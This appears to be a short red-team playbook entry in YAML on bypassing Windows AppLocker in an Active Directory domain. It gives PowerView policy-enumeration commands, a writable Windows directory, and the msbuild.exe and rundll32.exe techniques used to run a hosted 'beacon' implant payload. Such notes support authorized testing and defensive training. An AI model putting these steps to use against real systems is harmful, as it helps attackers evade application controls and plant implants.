title: Windows AppLocker Bypass
category: 
  - AD:
    - Defense Evasion:
      - AppLocker
tactic: Defense Evasion
tags: []
description: 
references: 
  - https://lolbas-project.github.io/

  - type: file
    name: applocker_bypass_msbuild.csproj

steps:
  - description: Enumerate AppLocker policies
    options: 
      - tool: Powerview.ps1
        usage: |
          #GPO
          Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath
          type \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol

          #If on a local machine
          Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
  
  - description: Writable Paths in Windows directory
    options: 
      - tool: cmd
        usage: |
          C:\Windows\Tasks
  
  - description: LOLBas
    options: 
      - tool: msbuild.exe
        usage: |
          Modify applocker_bypass_msbuild.csproj
          Host the payload (beacon.bin file)
          Run C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe applocker_bypass_msbuild.csproj
  
  - description: dll (if not enforced)
    options: 
      - tool: rundll32.exe
        usage: |
          C:\Windows\System32\rundll32.exe http_x64.dll,StartW